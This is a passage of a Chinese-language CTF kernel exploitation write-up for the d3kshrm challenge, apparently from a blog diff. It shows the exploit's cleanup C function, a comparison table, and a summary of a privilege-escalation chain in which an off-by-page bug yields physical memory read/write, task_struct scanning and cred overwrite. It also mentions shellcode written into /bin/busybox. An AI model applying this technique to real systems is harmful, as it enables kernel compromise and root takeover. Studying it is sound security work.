+在完成了所有验证操作后，需要清理所有分配的资源，确保系统状态的完整性和稳定性。资源清理不仅是良好的编程实践，也是安全验证的重要部分，可以避免资源泄漏和系统状态异常。
+
+关闭所有设备文件描述符。每个设备文件描述符对应一个d3kshrm驱动模块的打开实例。关闭操作会触发驱动的`release`函数，该函数执行必要的清理工作，包括减少引用计数、释放相关资源等。
+
+解除所有内存映射。对每个有效的映射地址调用`munmap`，释放虚拟地址空间，触发内核清理相关的页面映射。
+
+关闭所有管道文件描述符。对每个管道的读端和写端分别调用`close`，释放管道资源，触发内核清理相关的缓冲区。
+
+记录清理完成信息，结束验证过程。
+
+```c
+void phase_resource_cleanup(void) {
+    log.info("===========================================================");
+    log.info("PHASE 10: RESOURCE CLEANUP & FINALIZATION                  ");
+    log.info("===========================================================");
+
+    log.info("Performing resource cleanup");
+
+    // Close device file descriptors
+    for (int i = 0; i < CHUNK_COUNT * 2; i++) {
+        if (dev_fd[i] > 0) {
+            close(dev_fd[i]);
+        }
+    }
+
+    // Unmap victim mappings
+    for (int i = 0; i < CHUNK_COUNT * 2; i++) {
+        if (victim_map[i] != MAP_FAILED && victim_map[i] != NULL) {
+            munmap(victim_map[i], MREMAP_SIZE);
+        }
+    }
+
+    // Close pipe file descriptors
+    for (int i = 0; i < MAX_PIPE_COUNT; i++) {
+        if (pipe_fds[i][0] > 0) {
+            close(pipe_fds[i][0]);
+        }
+        if (pipe_fds[i][1] > 0) {
+            close(pipe_fds[i][1]);
+        }
+    }
+
+    log.info("Cleanup completed");
+}
+```
+
+### 5-12. 技术对比
+
+| 对比维度         | 第三章：基础验证                                   | 第五章：进阶验证                       |
+| ---------------- | -------------------------------------------------- | -------------------------------------- |
+| **验证目标**     | 验证边界检查漏洞的存在性和可触发，实现目标文件修改 | 构建任意物理内存读写原语，实现权限提升 |
+| **技术复杂度**   | 中等，单一漏洞触发                                 | 高，多阶段复杂内存操作                 |
+| **内存布局构造** | 单次构造，pages数组与pipe_buffer交错分布           | 两次构造，包含清理和二次喷洒           |
+| **资源使用**     | 240个管道，32个chunk                               | 240个管道，64个chunk（分阶段使用）     |
+| **内核信息获取** | 仅验证漏洞触发，无内核信息泄漏                     | 泄漏内核指针，计算地址空间偏移         |
+| **能力提升**     | 越界访问并修改目标文件                             | 任意物理内存读写原语                   |
+| **系统影响**     | 文件系统操作，修改目标文件内容                     | 内核内存读写，可能影响系统稳定性       |
+| **技术价值**     | 验证漏洞存在性和初步危害                           | 展示完整利用链，评估防御机制有效性     |
+
+**关键技术演进**：
+
+1. **从检测到利用**：第三章主要验证漏洞的可检测性和初步利用，第五章展示了完整的利用链
+2. **从文件操作到内存操作**：第三章实现对目标文件的读取和修改，第五章构建了对内核物理内存的读写原语
+3. **从用户空间到内核空间**：第三章操作限于文件系统页面缓存，第五章实现了对整个内核内存空间的访问
+4. **从局部到全局**：第三章关注特定内存区域，第五章实现了对整个物理内存的访问
+5. **从文件修改到权限提升**：第三章通过修改目标文件展示潜在危害，第五章通过权限提升展示实际安全影响
+
+### 5-13. 技术总结
+
+本章完整展示了基于Off-by-Page边界检查漏洞构建任意物理内存读写原语并实现权限提升的完整验证过程。整个验证过程分为十个逻辑阶段，从环境初始化到最终权限提升，涵盖了现代操作系统安全验证的多个关键技术点。通过精心设计的多次内存布局构造和清理操作，成功将初始的越界访问能力提升为任意物理内存读写能力，进而定位关键内核数据结构并修改进程凭证，实现了权限提升验证。验证过程中，首先通过`find_vmemmap_base()`函数定位内核内存管理结构，然后通过`scan_for_task_structs()`函数扫描物理内存定位当前进程和root进程的task_struct结构，最后通过`overwrite_cred_with_root()`函数修改当前进程凭证实现权限提升。整个过程展示了边界检查漏洞的严重性，一个字符的差异（`>`与`>=`）可导致完全突破系统安全边界，为系统安全设计和漏洞防护提供了全面的技术参考。与第三章相比，第三章通过越界访问实现了对目标文件（/bin/busybox）的读取和修改，通过`memcpy`操作将shellcode写入目标文件，展示了漏洞的初步危害；而本章则进一步构建了任意物理内存读写原语，实现了权限提升，展示了漏洞的完整利用链。验证不仅展示了漏洞的技术细节，更强调了在系统设计、实现和运维全过程中贯彻安全原则的重要性，为深度防御、最小权限、失效安全等安全原则在实践中的应用提供了具体案例。
+
+### 5-14. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/OffByPage/OffByPage_002.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 - https://github.com/BinRacer/pwn4kernel/tree/master/src/OffByPage3
+- https://github.com/BinRacer/pwn4kernel/tree/master/src/OffByPage4
 - https://9anux.org/2025/06/02/d3kshrm
 - https://blog.arttnba3.cn/2025/06/04/CTF-0X0A_D3CTF2025_D3KSHRM_D3KHEAP2
